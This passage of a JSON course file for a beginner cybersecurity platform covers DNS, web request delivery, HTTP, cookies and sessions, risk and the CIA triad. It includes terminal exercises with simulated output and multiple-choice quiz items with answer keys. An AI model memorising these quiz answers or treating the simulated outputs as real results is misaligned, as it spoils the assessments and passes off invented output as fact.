      "learned": [
        "How DNS maps domain names to numerical IP addresses",
        "The hierarchy: Root -> TLD -> Authoritative nameservers",
        "Core record types: A, AAAA, CNAME, MX, and TXT",
        "How DHCP's DORA process assigns network addresses"
      ],
      "practiced": [
        "dig endlessus.in +short",
        "Resolving domain names",
        "Understanding DNS answers"
      ]
    },
    "nextRoomId": "room-11"
  },
  {
    "id": "room-11",
    "stage": 3,
    "stageTitle": "Stage 3 — How the Web Works",
    "title": "How the Internet Delivers a Website",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "25 min",
    "prerequisites": "Stage 2 (Networking Fundamentals)",
    "whyAreYouHere": "You open your browser and type `https://endlessus.in`. Less than one second later, text, buttons, and animations appear on your screen. What actually happened behind the glass during that single second? This room synthesizes everything you've learned so far — DNS, IP routing, TCP handshakes, TLS encryption, and HTTP — into one complete, visually stunning end-to-end journey.",
    "objectives": [
      "Follow the complete 8-step lifecycle of a web request",
      "Understand URL structure: Scheme, Domain, Port, Path, Query string, and Fragment",
      "Learn how TLS (Transport Layer Security) encrypts communication over public networks",
      "Understand the roles of Web Servers, Reverse Proxies, and CDN Edge Nodes",
      "Inspect the timing breakdown of a live web request"
    ],
    "vocabulary": [
      {
        "term": "URL (Uniform Resource Locator)",
        "definition": "The complete web address used to locate a specific resource on the internet (e.g., `https://endlessus.in/learning.html?theme=normal`)."
      },
      {
        "term": "TLS / SSL",
        "definition": "Transport Layer Security: the cryptographic protocol that provides privacy and data integrity between two communicating computer applications."
      },
      {
        "term": "HTTPS (Port 443)",
        "definition": "HTTP layered over an encrypted TLS connection, preventing eavesdropping and tampering by network adversaries."
      },
      {
        "term": "CDN (Content Delivery Network)",
        "definition": "A geographically distributed network of proxy servers that cache content close to end users for high speed."
      },
      {
        "term": "Reverse Proxy",
        "definition": "A server (like Nginx or Cloudflare) positioned in front of web servers to handle TLS, caching, and load balancing."
      }
    ],
    "lessons": [
      {
        "title": "1. The 8-Step Web Request Odyssey",
        "content": "What happens when you hit Enter on `https://endlessus.in`:\n1. **URL Parsing**: Browser separates Scheme (`https`), Host (`endlessus.in`), Port (`443`), and Path (`/`).\n2. **DNS Resolution**: Browser queries cache -> resolver -> authoritative server to discover destination IP (`185.199.108.153`).\n3. **TCP 3-Way Handshake**: Client and server exchange SYN -> SYN-ACK -> ACK on port 443.\n4. **TLS Key Exchange**: Client and server exchange cryptographic certificates, verify server identity, and negotiate an AES session key.\n5. **HTTP Request**: Browser transmits `GET / HTTP/2` encrypted inside TLS.\n6. **Server Processing**: Web server / reverse proxy routes request to application backend.\n7. **HTTP Response**: Server transmits status `200 OK` with HTML content.\n8. **Browser Rendering**: Browser parses HTML, constructs DOM, downloads CSS/JS, and paints pixels."
      }
    ],
    "seeExamples": [
      {
        "title": "Complete Web Request Flowchart",
        "codeOrDiagram": "[ Browser: User types URL ]\n            ↓ Step 1 & 2\n[ DNS Resolver: Resolves endlessus.in -> 185.199.108.153 ]\n            ↓ Step 3\n[ TCP Handshake: SYN -> SYN-ACK -> ACK on Port 443 ]\n            ↓ Step 4\n[ TLS Handshake: Certificate verified & Session Keys established ]\n            ↓ Step 5 & 6\n[ Encrypted HTTP GET / transmitted across ISP and Fiber ]\n            ↓ Step 7\n[ Web Server returns 200 OK + HTML payload ]\n            ↓ Step 8\n[ Browser renders DOM & executes JavaScript ]",
        "explanation": "Every modern website interaction traverses this exact pipeline before you see a single image."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Inspect the timing phases (DNS, TCP Connect, TLS Handshake, and First Byte) of connecting to `https://endlessus.in` using curl:",
      "initialCommand": "",
      "expectedCommand": "curl -w \"DNS: %{time_namelookup}s | Connect: %{time_connect}s | TLS: %{time_appconnect}s | Total: %{time_total}s\\n\" -o /dev/null -s https://endlessus.in",
      "simulatedOutput": "DNS: 0.012s | Connect: 0.038s | TLS: 0.076s | Total: 0.114s\n[+] Success! Complete request completed in 114ms: DNS (12ms) -> TCP (26ms) -> TLS (38ms) -> Content delivery (38ms).",
      "explanation": "`curl -w` formats custom diagnostic metrics, allowing security analysts to profile connection latency and SSL handshakes."
    },
    "questions": [
      {
        "id": "r11-q1",
        "type": "multiple-choice",
        "question": "During which phase of delivering an HTTPS website are cryptographic certificates validated and symmetric encryption keys negotiated?",
        "options": [
          "The DNS Resolution phase",
          "The TLS Handshake phase",
          "The ARP Broadcast phase",
          "The HTML Parsing phase"
        ],
        "correctIndex": 1,
        "explanation": "The TLS (Transport Layer Security) handshake negotiates ciphers and authenticates the server's public key certificate."
      },
      {
        "id": "r11-q2",
        "type": "multiple-choice",
        "question": "If a website uses unencrypted HTTP on port 80 instead of HTTPS on port 443, what can a malicious actor on the same Wi-Fi network see?",
        "options": [
          "Only the domain name, but all passwords are automatically masked",
          "The entire contents of requests and responses, including login passwords, session cookies, and private messages in plain text",
          "Nothing, because Wi-Fi routers automatically encrypt all web traffic with RSA",
          "Only the server's CPU temperature"
        ],
        "correctIndex": 1,
        "explanation": "Unencrypted HTTP sends everything in plain text over the air. Anyone running Wireshark or ARP spoofing can read all cookies and credentials."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Profile Web Latency Breakdown",
        "instruction": "Execute the curl timing command to measure the real-world connection phases of `https://endlessus.in`.",
        "hints": [
          "Concept: Measure DNS, Connect, TLS, and Total times.",
          "Direction: Use curl with the `-w` write-out parameter.",
          "Tool: `curl`",
          "Syntax: Run the provided timing command.",
          "Explanation: Demonstrates how fast modern web infrastructure operates."
        ]
      }
    ],
    "explainResult": "The `curl` command opened a socket, resolved DNS via system getaddrinfo, initiated the TCP 3-way handshake, exchanged TLS client/server hellos, verified the certificate chain, and retrieved the web index.",
    "securityConnection": "Every step in this delivery chain has a corresponding cyber attack: DNS Cache Poisoning at Step 2, TCP SYN Flooding at Step 3, Man-in-the-Middle SSL Stripping at Step 4, and Web Application Injection at Step 6. Understanding the delivery chain enables you to spot where security controls fail.",
    "completion": {
      "learned": [
        "The 8-step lifecycle of an internet web request",
        "The difference between HTTP (port 80) and encrypted HTTPS (port 443)",
        "The role of TLS handshakes in encrypting data in-flight",
        "How reverse proxies and CDNs protect origin servers"
      ],
      "practiced": [
        "curl timing profiling",
        "Tracing request sequences from DNS to DOM",
        "Evaluating unencrypted vs encrypted transport"
      ]
    },
    "nextRoomId": "room-12"
  },
  {
    "id": "room-12",
    "stage": 3,
    "stageTitle": "Stage 3 — How the Web Works",
    "title": "HTTP Fundamentals: Requests & Responses",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 11 (How the Internet Delivers a Website)",
    "whyAreYouHere": "Web security testing is impossible without being able to read and construct raw HTTP traffic. Web applications do not operate on magic; they communicate via plain-text messages following the HTTP standard. In this room, you will dissect HTTP request methods (GET, POST, PUT, DELETE), understand status code ranges (200, 302, 403, 404, 500), and inspect request headers.",
    "objectives": [
      "Understand the stateless nature of the Hypertext Transfer Protocol (HTTP)",
      "Dissect an HTTP Request: Method, Path, Version, Headers, and Body",
      "Master HTTP Methods: GET (retrieve), POST (submit), PUT (replace), DELETE (remove)",
      "Learn HTTP Response Status Code classes: 2xx (Success), 3xx (Redirect), 4xx (Client Error), 5xx (Server Error)",
      "Send and analyze raw HTTP requests using curl and netcat"
    ],
    "vocabulary": [
      {
        "term": "HTTP (Hypertext Transfer Protocol)",
        "definition": "The application-level protocol used for transmitting hypermedia documents across the World Wide Web."
      },
      {
        "term": "GET Method",
        "definition": "An HTTP method used to request data from a specified resource without altering server state."
      },
      {
        "term": "POST Method",
        "definition": "An HTTP method used to send data (such as login credentials or form inputs) to the server to create or update a resource."
      },
      {
        "term": "Status Code",
        "definition": "A 3-digit number returned by the server indicating the result of the client's request (e.g. 200 OK, 404 Not Found)."
      },
      {
        "term": "HTTP Headers",
        "definition": "Colon-separated key-value pairs (e.g. `User-Agent`, `Content-Type`) providing metadata about the request or response."
      },
      {
        "term": "HTTP Body",
        "definition": "The optional data payload sent after the headers, containing form parameters, JSON data, or file uploads."
      }
    ],
    "lessons": [
      {
        "title": "1. The Anatomy of an HTTP Request",
        "content": "A raw HTTP request looks like this plain text:\n```http\nPOST /login HTTP/1.1\nHost: endlessus.in\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\n\nusername=cadet&password=Secret123\n```\n• Line 1: **Request Line** — Method (`POST`), Path (`/login`), Protocol (`HTTP/1.1`).\n• Lines 2-5: **Headers** — Metadata specifying host, client type, and format.\n• Line 6: **Blank Line** (`\\r\\n\\r\\n`) — Separates headers from body.\n• Line 7: **Message Body** — The actual data sent to the server."
      },
      {
        "title": "2. Decoding HTTP Status Codes",
        "content": "Status codes tell you what happened immediately:\n• **2xx (Success)**: `200 OK` (Resource found and served), `201 Created` (New item added).\n• **3xx (Redirection)**: `301 Moved Permanently`, `302 Found / Temporary Redirect` (Go to this other URL).\n• **4xx (Client Error)**: `400 Bad Request` (Malformed syntax), `401 Unauthorized` (Login required), `403 Forbidden` (Permission denied), `404 Not Found` (Resource does not exist).\n• **5xx (Server Error)**: `500 Internal Server Error` (Backend code crashed), `502 Bad Gateway` (Upstream proxy failed)."
      }
    ],
    "seeExamples": [
      {
        "title": "Anatomy of an HTTP Response",
        "codeOrDiagram": "HTTP/1.1 200 OK\nDate: Sun, 05 Oct 2026 16:35:00 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Type: text/html; charset=UTF-8\nContent-Length: 142\n\n<!DOCTYPE html>\n<html>\n  <head><title>Dashboard</title></head>\n  <body><h1>Welcome Cadet</h1></body>\n</html>",
        "explanation": "Status line, response headers (metadata), a mandatory blank line, followed by the HTML body."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Send a raw HTTP GET request to our lab web server and inspect the status line and headers using `curl -v http://localhost:8080/api/status`:",
      "initialCommand": "",
      "expectedCommand": "curl -v http://localhost:8080/api/status",
      "simulatedOutput": "> GET /api/status HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/8.5.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Content-Length: 32\n<\n{\"status\":\"operational\",\"auth\":false}\n[+] Success! You inspected both outgoing request headers (>) and incoming response headers (<).",
      "explanation": "`curl -v` (verbose) displays the exact HTTP dialogue: lines starting with `>` are what you sent; lines with `<` are what the server returned."
    },
    "questions": [
      {
        "id": "r12-q1",
        "type": "multiple-choice",
        "question": "Which HTTP status code indicates that the requested file or endpoint could not be found on the server?",
        "options": [
          "200 OK",
          "302 Found",
          "404 Not Found",
          "500 Internal Server Error"
        ],
        "correctIndex": 2,
        "explanation": "`404 Not Found` is the standard status code indicating the server cannot locate the requested URI."
      },
      {
        "id": "r12-q2",
        "type": "multiple-choice",
        "question": "What character sequence is required in raw HTTP to separate the headers from the body payload?",
        "options": [
          "An empty blank line (Carriage Return + Line Feed: `\\r\\n\\r\\n`)",
          "Three semicolons `;;;`",
          "An XML tag `<end-headers>`",
          "A null byte `\\x00`"
        ],
        "correctIndex": 0,
        "explanation": "RFC 7230 strictly mandates a double CRLF (an empty blank line) to signal the end of HTTP headers."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Analyze Verbose HTTP Headers",
        "instruction": "Run `curl -v http://localhost:8080/api/status` to view the request and response handshake.",
        "hints": [
          "Concept: Verbose HTTP inspection.",
          "Direction: Use the `-v` flag with curl.",
          "Tool: `curl`",
          "Syntax: `curl -v http://localhost:8080/api/status`",
          "Explanation: Displays full headers and payload."
        ]
      }
    ],
    "explainResult": "The `curl` command opened a TCP connection to localhost:8080, transmitted formatted HTTP request lines, received the `200 OK` header block, and parsed the JSON body.",
    "securityConnection": "Every web vulnerability scanner (Burp Suite, OWASP ZAP, ffuf) is fundamentally an HTTP crafting tool! When testing for SQL injection, XSS, or IDOR, you will modify headers, change methods from GET to POST, and inject payloads directly into the request body.",
    "completion": {
      "learned": [
        "The anatomy of an HTTP request (Method, Path, Version, Headers, Body)",
        "The anatomy of an HTTP response (Status Line, Headers, Payload)",
        "Standard status codes: 200, 301/302, 400, 401, 403, 404, 500",
        "Using curl -v to analyze raw HTTP headers"
      ],
      "practiced": [
        "curl -v",
        "Inspecting request and response headers",
        "Differentiating client errors from server errors"
      ]
    },
    "nextRoomId": "room-13"
  },
  {
    "id": "room-13",
    "stage": 3,
    "stageTitle": "Stage 3 — How the Web Works",
    "title": "Browsers, Cookies & Sessions",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "25 min",
    "prerequisites": "Room 12 (HTTP Fundamentals)",
    "whyAreYouHere": "HTTP has a profound quirk: it is completely **stateless**. This means when you click from page 1 to page 2 on a website, the server has no memory of who you are or that you just logged in three seconds ago! How do modern web apps keep you logged in as you browse? The answer is **Cookies and Sessions**. In this room, you will learn how browsers store state, how session tokens work, and why cookies are prime targets for cyber attackers.",
    "objectives": [
      "Understand why HTTP is stateless and how state is maintained",
      "Learn how the server issues cookies using the `Set-Cookie` header",
      "Understand Session Identifiers (Session IDs) and server-side session stores",
      "Master critical cookie security flags: `HttpOnly`, `Secure`, and `SameSite`",
      "Understand session hijacking and how attackers steal login tokens"
    ],
    "vocabulary": [
      {
        "term": "Stateless Protocol",
        "definition": "A communication protocol in which the receiver retains no memory or session state between independent requests."
      },
      {
        "term": "HTTP Cookie",
        "definition": "A small piece of data stored by the user's web browser, automatically sent back to the server with subsequent requests."
      },
      {
        "term": "Session ID",
        "definition": "A random, high-entropy unique string generated by the server upon successful authentication to track a user's session."
      },
      {
        "term": "HttpOnly Flag",
        "definition": "A cookie attribute that blocks JavaScript (`document.cookie`) from accessing the cookie, protecting it from theft via XSS."
      },
      {
        "term": "Secure Flag",
        "definition": "A cookie attribute ensuring the cookie is only transmitted over encrypted HTTPS connections, never over unencrypted HTTP."
      },
      {
        "term": "SameSite Flag",
        "definition": "A cookie attribute (`Strict`, `Lax`, or `None`) that controls whether cookies are sent with cross-site requests, mitigating CSRF."
      }
    ],
    "lessons": [
      {
        "title": "1. The Coat Check Analogy",
        "content": "When you check your coat at a theater:\n1. You give the attendant your coat.\n2. They hand you a small ticket with a random number: **#4092**.\n3. When you return, you don't re-explain who you are; you simply show ticket **#4092**, and they hand back your coat.\n\nThat ticket is a **Session Cookie**! When you log in with your username and password, the server verifies them, generates a random session ticket (`SESSIONID=a8f9c2d1...`), and sends it back in a `Set-Cookie` header. For every future click, your browser automatically attaches that cookie."
      },
      {
        "title": "2. The Essential Cookie Security Flags",
        "content": "Because session cookies grant complete account access, browsers provide three crucial defense flags:\n• `HttpOnly`: Tells the browser: *\"Never let JavaScript scripts read this cookie.\"* If a hacker finds an XSS bug, they still cannot steal an HttpOnly cookie!\n• `Secure`: Tells the browser: *\"Never transmit this cookie over unencrypted HTTP.\"* Prevents coffee-shop Wi-Fi eavesdroppers from sniffing the session token.\n• `SameSite=Lax/Strict`: Tells the browser: *\"Do not send this cookie when requests originate from external third-party websites.\"* Prevents CSRF attacks."
      }
    ],
    "seeExamples": [
      {
        "title": "Setting and Sending a Session Cookie",
        "codeOrDiagram": "[ Step 1: User logs in ]\nPOST /api/login HTTP/1.1\nHost: endlessus.in\nusername=cadet&password=ValidPassword123\n\n[ Step 2: Server responds with Set-Cookie ]\nHTTP/1.1 200 OK\nSet-Cookie: session_id=x99aK10zP9q; Path=/; Secure; HttpOnly; SameSite=Lax\n\n[ Step 3: Browser automatically attaches Cookie on next request ]\nGET /profile HTTP/1.1\nHost: endlessus.in\nCookie: session_id=x99aK10zP9q",
        "explanation": "Notice the three flags: `Secure`, `HttpOnly`, and `SameSite=Lax`. This is an enterprise-hardened session cookie."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate a login request that returns a session cookie, storing it into a local cookie jar using `curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login`:",
      "initialCommand": "",
      "expectedCommand": "curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login",
      "simulatedOutput": "HTTP/1.1 200 OK\nSet-Cookie: auth_token=e4d9b26a8f110c7e; Path=/; HttpOnly; Secure\n{\"message\":\"Login successful. Session established.\"}\n[+] Success! Cookie stored in cookies.txt: auth_token=e4d9b26a8f110c7e.",
      "explanation": "`curl -c <file>` instructs curl to act like a web browser's cookie storage engine, capturing any `Set-Cookie` headers for future requests."
    },
    "questions": [
      {
        "id": "r13-q1",
        "type": "multiple-choice",
        "question": "Which cookie security attribute prevents client-side JavaScript (such as `document.cookie`) from reading or extracting the session token?",
        "options": [
          "SameSite",
          "HttpOnly",
          "Max-Age",
          "Domain"
        ],
        "correctIndex": 1,
        "explanation": "The `HttpOnly` flag restricts cookie access strictly to HTTP headers, blocking JavaScript access and preventing session theft via XSS."
      },
      {
        "id": "r13-q2",
        "type": "multiple-choice",
        "question": "If an attacker manages to obtain a legitimate user's active session cookie, what can they do?",
        "options": [
          "Nothing, because cookies can only be used on the physical computer that created them",
          "They can impersonate the victim and perform actions as that user without ever knowing their password (Session Hijacking)",
          "They can only view the server's public IP address",
          "They must crack the password hash before using the cookie"
        ],
        "correctIndex": 1,
        "explanation": "Since the server trusts the session cookie as proof of authentication, possessing the cookie allows complete account takeover (Session Hijacking)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Capture and Save Session Cookie",
        "instruction": "Use curl with `-c cookies.txt` to capture the authenticated session cookie from the lab login endpoint.",
        "hints": [
          "Concept: Store incoming cookies in a cookie jar file.",
          "Direction: Use the `-c` flag with curl.",
          "Tool: `curl`",
          "Syntax: `curl -c cookies.txt -d \"user=cadet&pass=letmein\" http://localhost:8080/login`",
          "Explanation: Saves cookie for session reuse."
        ]
      }
    ],
    "explainResult": "The server validated the credentials, generated a 64-bit session token, and passed it in the `Set-Cookie` header. Curl captured this into `cookies.txt`.",
    "securityConnection": "Cookie theft is one of the most lucrative objectives for cyber adversaries. Malware like 'Infostealers' specifically scan Chrome and Firefox profile folders on infected computers to extract stored session cookies, allowing hackers to bypass Multi-Factor Authentication (MFA) on corporate accounts!",
    "completion": {
      "learned": [
        "Why HTTP is stateless and how cookies preserve session state",
        "How servers generate and issue Session IDs via Set-Cookie",
        "The critical defense flags: HttpOnly, Secure, and SameSite",
        "The mechanism and danger of Session Hijacking"
      ],
      "practiced": [
        "curl -c cookies.txt",
        "Inspecting cookie jar structures",
        "Evaluating cookie security flags"
      ]
    },
    "nextRoomId": "room-14"
  },
  {
    "id": "room-14",
    "stage": 4,
    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
    "title": "What Are We Protecting? Assets, Threats & Risk",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "20 min",
    "prerequisites": "Stage 3 (How the Web Works)",
    "whyAreYouHere": "You now understand computers, operating systems, networks, and the web. But what are we actually trying to defend? Cybersecurity is not about installing antivirus and hoping for the best; it is a rigorous discipline of risk management. In this room, you will learn the fundamental equation that governs all enterprise security: how Assets, Threats, Vulnerabilities, and Controls determine business Risk.",
    "objectives": [
      "Define the four core pillars: Assets, Threats, Vulnerabilities, and Risk",
      "Master the fundamental Risk Equation: Risk = Threat × Vulnerability × Asset Impact",
      "Understand what constitutes an organization's Attack Surface",
      "Differentiate between Preventative, Detective, and Corrective security controls",
      "Calculate risk scores in a simulated enterprise scenario"
    ],
    "vocabulary": [
      {
        "term": "Asset",
        "definition": "Anything of value to an organization that must be protected, including customer data, intellectual property, financial records, and hardware servers."
      },
      {
        "term": "Threat",
        "definition": "Any potential circumstance or event that could exploit a vulnerability to cause harm (e.g. ransomware gangs, rogue insiders, power outages)."
      },
      {
        "term": "Vulnerability",
        "definition": "A flaw or weakness in system design, implementation, or operation that could be leveraged by a threat."
      },
      {
        "term": "Risk",
        "definition": "The potential for loss, damage, or destruction of an asset resulting from a threat exploiting a vulnerability."
      },
      {
        "term": "Attack Surface",
        "definition": "The total sum of all possible points (endpoints, ports, web forms, employees) where an unauthorized user can try to enter or extract data."
      },
      {
        "term": "Security Control",
        "definition": "A safeguard or countermeasure prescribed to reduce risk and protect confidentiality, integrity, or availability."
      }
    ],
    "lessons": [
      {
        "title": "1. The Fundamental Risk Equation",
        "content": "Many beginners confuse threats with vulnerabilities. Here is how they connect:\n• An unpatched web server with an open SQL injection bug is a **Vulnerability**.\n• A criminal hacking group seeking financial gain is a **Threat**.\n• If that web server contains the credit card records of 500,000 customers, that is the **Asset**.\n• **Risk** is what happens when the Threat finds the Vulnerability to compromise the Asset!"
      },
      {
        "title": "2. The Three Control Categories",
        "content": "Security teams deploy three layers of defense:\n1. **Preventative Controls**: Block attacks before they happen (e.g. firewalls, strong passwords, input validation).\n2. **Detective Controls**: Identify attacks while or after they happen (e.g. intrusion detection systems, security audit logs, file integrity monitors).\n3. **Corrective Controls**: Minimize damage and restore normal operations after an incident (e.g. daily offline backups, incident response plans)."
      }
    ],
    "seeExamples": [
      {
        "title": "Risk Calculation Matrix",
        "codeOrDiagram": "Likelihood   Impact      Risk Level   Recommended Action\nHigh         Critical    CRITICAL     Fix immediately (Emergency patch)\nHigh         Low         MEDIUM       Schedule in next sprint\nLow          Critical    HIGH         Deploy mitigating controls\nLow          Low         LOW          Accept or monitor",
        "explanation": "Organizations prioritize vulnerabilities based on likelihood and impact, not just theoretical severity."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Audit an asset inventory file to identify exposed critical assets using `cat /etc/endlessus/assets.json`:",
      "initialCommand": "",
      "expectedCommand": "cat /etc/endlessus/assets.json",
      "simulatedOutput": "{\n  \"asset_id\": \"DB-PRIMARY-01\",\n  \"asset_type\": \"Production PostgreSQL Database\",\n  \"data_classification\": \"CONFIDENTIAL - PCI/Customer Records\",\n  \"vulnerability\": \"CVE-2024-Unpatched Remote Code Execution\",\n  \"exposure\": \"Publicly accessible on port 5432\",\n  \"calculated_risk\": \"CRITICAL\"\n}\n[+] Success! Critical unpatched asset identified with public exposure.",
      "explanation": "Auditing asset registries allows security architects to spot misconfigured public database servers immediately."
    },
    "questions": [
      {
        "id": "r14-q1",
        "type": "multiple-choice",
        "question": "A company operates an internal accounting server that has a severe unpatched vulnerability, but the server is completely disconnected from the internet and inside a locked vault. Why is the actual risk considered low?",
        "options": [
          "Because accounting data has zero value to attackers",
          "Because the threat cannot reach the vulnerability, making the likelihood of remote exploitation near zero",
          "Because unpatched bugs fix themselves over time",
          "Because Linux kernels are immune to malware"
        ],
        "correctIndex": 1,
        "explanation": "Risk requires both vulnerability and threat likelihood. If an asset is isolated from threats, the risk of exploitation drops dramatically."
      },
      {
        "id": "r14-q2",
        "type": "multiple-choice",
        "question": "Which of the following is an example of a Detective security control?",
        "options": [
          "A steel security door with a biometric fingerprint scanner",
          "A web application firewall that blocks SQL injection requests",
          "A Security Information and Event Management (SIEM) system analyzing login logs for unusual nighttime spikes",
          "An automated daily offline backup tape"
        ],
        "correctIndex": 2,
        "explanation": "A SIEM analyzes logs to detect ongoing or past intrusions, making it a detective control."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Inspect Asset Risk Profile",
        "instruction": "Read the asset inventory file using `cat /etc/endlessus/assets.json` to inspect classification levels.",
        "hints": [
          "Concept: Inspect asset management database.",
          "Direction: Use the cat command.",
          "Tool: `cat`",
          "Syntax: `cat /etc/endlessus/assets.json`",
          "Explanation: Displays asset metadata and risk."
        ]
      }
    ],
    "explainResult": "The `cat` utility read the JSON object defining asset classification, exposure vector, and calculated risk level.",
    "securityConnection": "Every commercial penetration test begins with scoping assets. Testers do not attack random servers; they focus testing on high-value assets (customer databases, payment gateways) where vulnerabilities create the highest business risk.",
    "completion": {
      "learned": [
        "The core concepts: Asset, Threat, Vulnerability, and Risk",
        "The risk formula: Risk = Threat × Vulnerability × Asset Value",
        "The concept of Attack Surface and exposure vectors",
        "Preventative, Detective, and Corrective security controls"
      ],
      "practiced": [
        "cat /etc/endlessus/assets.json",
        "Evaluating asset risk rankings",
        "Differentiating control types"
      ]
    },
    "nextRoomId": "room-15"
  },
  {
    "id": "room-15",
    "stage": 4,
    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
    "title": "The CIA Triad: Confidentiality, Integrity & Availability",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "25 min",
    "prerequisites": "Room 14 (What Are We Protecting?)",
    "whyAreYouHere": "If you ask a seasoned Chief Information Security Officer (CISO) what their ultimate mission is, they will not say 'stopping hackers'. They will say: 'protecting the CIA Triad'. The CIA Triad is the bedrock mental model of all information security worldwide. In this room, you will explore Confidentiality, Integrity, and Availability, and learn how to categorize any cyber incident in seconds.",
    "objectives": [
      "Master the three pillars of the CIA Triad: Confidentiality, Integrity, and Availability",
      "Understand Confidentiality (preventing unauthorized disclosure of data)",
      "Understand Integrity (preventing unauthorized modification, tampering, or destruction)",
      "Understand Availability (ensuring systems and data are accessible to authorized users when needed)",
      "Analyze real-world breach scenarios and map them accurately to C, I, or A impacts"
    ],
    "vocabulary": [
      {
        "term": "CIA Triad",
        "definition": "The foundational model of information security composed of Confidentiality, Integrity, and Availability."
      },
      {
        "term": "Confidentiality",
        "definition": "Ensuring that sensitive information is accessible only to authorized individuals, entities, or processes."
      },
      {
        "term": "Integrity",
        "definition": "Safeguarding the accuracy, completeness, and trustworthiness of data and systems from unauthorized alterations."
      },
      {
        "term": "Availability",
        "definition": "Ensuring that authorized parties have timely, reliable access to critical information and computing resources."
      },
      {
        "term": "Non-Repudiation",
        "definition": "The assurance that the sender or actor cannot deny having performed a transaction or message."
      }
    ],
    "lessons": [
      {
        "title": "1. The Three Pillars in Everyday Life",
        "content": "Consider a modern hospital's patient records system:\n• **Confidentiality**: Only the patient's doctors should view their medical diagnosis and prescription history. If a nurse sells celebrity health records to a tabloid, **Confidentiality is breached**.\n• **Integrity**: If an attacker alters the patient's blood type in the database from O-positive to B-negative, the patient could die from a transfusion error. **Integrity is breached**.\n• **Availability**: If an ambulance rushes an emergency stroke victim into the trauma ward, but a DDoS attack has knocked the medical records system offline, doctors cannot look up allergies. **Availability is breached**."
      },
      {
        "title": "2. The Security Tradeoff",
        "content": "Security is often a delicate balancing act.\nIf you maximize Confidentiality to the extreme (disconnect the server, lock it in concrete, encrypt with a 1,000-character key), you destroy **Availability** because nobody can get their work done! Security professionals strive for the optimal balance tailored to each organization's risk tolerance."
      }
    ],
    "seeExamples": [
      {
        "title": "Mapping Incidents to the CIA Triad",
        "codeOrDiagram": "Scenario                                  Primary Impact\nData breach leaks 100,000 passwords       → CONFIDENTIALITY\nAttacker alters financial balance ledger  → INTEGRITY\nRansomware encrypts hospital drives       → AVAILABILITY & INTEGRITY\nDDoS flood takes banking app offline      → AVAILABILITY",
        "explanation": "Security analysts immediately categorize security alerts under C, I, or A to determine incident response priority."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate an integrity check by calculating the SHA-256 cryptographic checksum of our system's ledger using `sha256sum ledger.csv`:",
      "initialCommand": "",
      "expectedCommand": "sha256sum ledger.csv",
      "simulatedOutput": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  ledger.csv\n[+] Success! Cryptographic hash generated. If anyone changes a single character, this hash completely changes!",
      "explanation": "Cryptographic hashing is the primary technical tool used to guarantee Data Integrity."
    },
    "questions": [
      {
        "id": "r15-q1",
        "type": "multiple-choice",
        "question": "A malicious actor launches a Distributed Denial of Service (DDoS) attack that overwhelms an online banking website with junk traffic, preventing customers from logging in. Which pillar of the CIA Triad is directly compromised?",
        "options": [
          "Confidentiality",
          "Integrity",
          "Availability",
          "Non-repudiation"
        ],
        "correctIndex": 2,
        "explanation": "The attack prevents legitimate users from accessing the service when needed, directly violating Availability."
      },
      {
        "id": "r15-q2",
        "type": "multiple-choice",
        "question": "An insider employee secretly modifies an audit log file to erase their own user ID from a record of unauthorized wire transfers. Which pillar of the CIA Triad has been compromised?",
        "options": [
          "Availability",
          "Confidentiality",
          "Integrity",
          "Scalability"
        ],
        "correctIndex": 2,
        "explanation": "Tampering with or modifying records undermines the accuracy and trustworthiness of the data, violating Integrity."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Verify Ledger Integrity",
        "instruction": "Calculate the SHA-256 checksum of `ledger.csv` using `sha256sum ledger.csv`.",
        "hints": [
          "Concept: Cryptographic verification of data integrity.",
          "Direction: Use the sha256sum utility.",
          "Tool: `sha256sum`",
          "Syntax: `sha256sum ledger.csv`",
          "Explanation: Generates a 64-character hex hash."
        ]
      }
    ],
    "explainResult": "The `sha256sum` utility processed the entire file contents through the SHA-256 cryptographic algorithm, producing a unique 256-bit fingerprint.",
    "securityConnection": "Every security standard (ISO 27001, NIST SP 800-53, SOC 2) evaluates controls through the lens of Confidentiality, Integrity, and Availability. When writing penetration test reports, you will classify every discovered finding under the CIA pillar it harms.",
    "completion": {
      "learned": [
        "The three pillars: Confidentiality, Integrity, and Availability",
        "Real-world consequences of breaches in each pillar",
        "The concept of Non-Repudiation and auditability",
        "Using SHA-256 cryptographic hashing to verify data integrity"
      ],
      "practiced": [
        "sha256sum ledger.csv",
        "Classifying security incidents into CIA categories",
        "Evaluating security trade-offs"
      ]
    },
    "nextRoomId": "room-16"
  },
  {
    "id": "room-16",
    "stage": 4,
    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
    "title": "Authentication, Authorization & Accounting (AAA)",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "25 min",
    "prerequisites": "Room 15 (The CIA Triad)",
